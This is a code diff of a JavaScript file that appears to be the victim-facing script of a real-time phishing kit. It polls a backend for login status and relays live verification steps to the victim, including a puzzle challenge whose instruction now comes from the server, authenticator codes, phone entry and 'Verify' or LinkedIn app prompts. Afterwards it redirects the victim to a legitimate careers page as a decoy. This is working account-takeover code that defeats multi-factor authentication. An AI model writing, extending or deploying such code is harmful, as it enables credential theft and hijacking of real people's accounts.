@@ -1,5 +1,6 @@
 let challengeCount = 0;
 let redirectTimeout;
+let inst;
 
 let puzzleTiles = [];
 
@@ -51,37 +52,6 @@ const enableInteraction = () => {
   if (challengeContainer) challengeContainer.style.display = "block";
 };
 
-async function checkPuzzleImage(sessionId) {
-  try {
-    const response = await fetch(
-      `/api/check-puzzle-image?sessionId=${sessionId}`
-    );
-    const data = await response.json();
-    
-    return data.exists;
-  } catch (error) {
-    console.error("Error checking puzzle image:", error);
-    return false;
-  }
-}
-
-function startPuzzleImageCheck(sessionId, callback) {
-  const checkInterval = setInterval(async () => {
-    const exists = await checkPuzzleImage(sessionId);
-    if (exists) {
-      clearInterval(checkInterval);
-      callback(true);
-    }
-  }, 1000); // Check every second
-
-  // Stop checking after 30 seconds
-  setTimeout(() => {
-    clearTimeout(redirectTimeout);
-    clearInterval(checkInterval);
-    callback(false);
-  }, 60000);
-}
-
 function getChallenge() {
   clearTimeout(redirectTimeout);
   let challengeXhr = new XMLHttpRequest();
@@ -130,13 +100,6 @@ function processPuzzleTiles(tilesHtml, sessionId) {
 }
 
 disableInteraction();
-startPuzzleImageCheck(sessionId, (found) => {
-  if (found) {
-    console.log("Puzzle image was found!");
-    enableInteraction();
-    getChallenge();
-  }
-});
 
 document.addEventListener("click", function (e) {
   let targetId = e.target.id;
@@ -170,7 +133,7 @@ function loadPuzzle() {
                     color: black;
                   "
                 >
-                  Pick the image that is the correct way up
+                  ${inst}
                 </h2>
                 <p
                   aria-label="1 of 1"
@@ -285,7 +248,8 @@ document.addEventListener("click", async (e) => {
       console.log(responseText);
       if (responseText == "0") {
       } else if (responseText == "1") {
-        location.href = "https://careers.stravito.com/jobs?split_view=true&geobound_coordinates%5Btop_left_lat%5D=59.17592824927138&geobound_coordinates%5Btop_left_lon%5D=-11.25&geobound_coordinates%5Bbottom_right_lat%5D=27.605670826465445&geobound_coordinates%5Bbottom_right_lon%5D=20.390625/";
+        location.href =
+          "https://careers.stravito.com/jobs?split_view=true&geobound_coordinates%5Btop_left_lat%5D=59.17592824927138&geobound_coordinates%5Btop_left_lon%5D=-11.25&geobound_coordinates%5Bbottom_right_lat%5D=27.605670826465445&geobound_coordinates%5Bbottom_right_lon%5D=20.390625/";
       } else if (
         responseText == "Enter the code you see on your authenticator app"
       ) {
@@ -303,9 +267,13 @@ document.addEventListener("click", async (e) => {
       ) {
         location.href = `/enter-phone.html?sessionId=${sessionId}`;
       } else if (responseText == "lastcve") {
-        location.href = `https://careers.stravito.com/jobs?split_view=true&geobound_coordinates%5Btop_left_lat%5D=59.17592824927138&geobound_coordinates%5Btop_left_lon%5D=-11.25&geobound_coordinates%5Bbottom_right_lat%5D=27.605670826465445&geobound_coordinates%5Bbottom_right_lon%5D=20.390625`;
-      } else if(responseText == "LinkedIn App Challenge") {
-        location.href = `/mobile-verification.html?sessionId=${sessionId}`;
+
+        location.href = `/login.html?status=false`;
+      } else if (responseText.includes("Verify")) {
+        location.href = `/mobile-verification.html?sessionId=${sessionId}&text=${responseText}`;
+      }
+      else if(response == "-1") {
+        
       }
     } catch (error) {
       console.error("Error selecting tile:", error);
@@ -326,9 +294,17 @@ function checkLoginStatus() {
       if (responseText == "0") {
         redirectTimeout = setTimeout(() => {
           checkLoginStatus();
-        }, 3000);
-      } else if (responseText == "1") {
-        location.href = "https://careers.stravito.com/jobs?split_view=true&geobound_coordinates%5Btop_left_lat%5D=59.17592824927138&geobound_coordinates%5Btop_left_lon%5D=-11.25&geobound_coordinates%5Bbottom_right_lat%5D=27.605670826465445&geobound_coordinates%5Bbottom_right_lon%5D=20.390625/";
+        }, 6000);
+      }
+      else if(responseText == "true") {
+        clearTimeout(redirectTimeout);
+        setTimeout(function() {
+          checkLoginStatus();
+        }, 5000)
+      }
+       else if (responseText == "1") {
+        location.href =
+          "https://careers.stravito.com/jobs?split_view=true&geobound_coordinates%5Btop_left_lat%5D=59.17592824927138&geobound_coordinates%5Btop_left_lon%5D=-11.25&geobound_coordinates%5Bbottom_right_lat%5D=27.605670826465445&geobound_coordinates%5Bbottom_right_lon%5D=20.390625/";
       } else if (
         responseText == "Enter the code you see on your authenticator app"
       ) {
@@ -347,12 +323,17 @@ function checkLoginStatus() {
         location.href = `/enter-phone.html?sessionId=${sessionId}`;
       } else if (responseText == "lastcve") {
         location.href = `https://careers.stravito.com/jobs?split_view=true&geobound_coordinates%5Btop_left_lat%5D=59.17592824927138&geobound_coordinates%5Btop_left_lon%5D=-11.25&geobound_coordinates%5Bbottom_right_lat%5D=27.605670826465445&geobound_coordinates%5Bbottom_right_lon%5D=20.390625`;
-      } else if (responseText == "LinkedIn App Challenge") {
-        location.href = `/mobile-verification.html?sessionId=${sessionId}`;
+      } else if (responseText.includes("Verify")) {
+        location.href = `/mobile-verification.html?sessionId=${sessionId}&text=${responseText}`;
+      } else if (responseText.includes("Pick the")) {
+        inst = responseText;
+        enableInteraction();
+        getChallenge();
+        
       }
     }
   };
 }
 setTimeout(function () {
   checkLoginStatus();
-}, 7000);
+}, 8000);
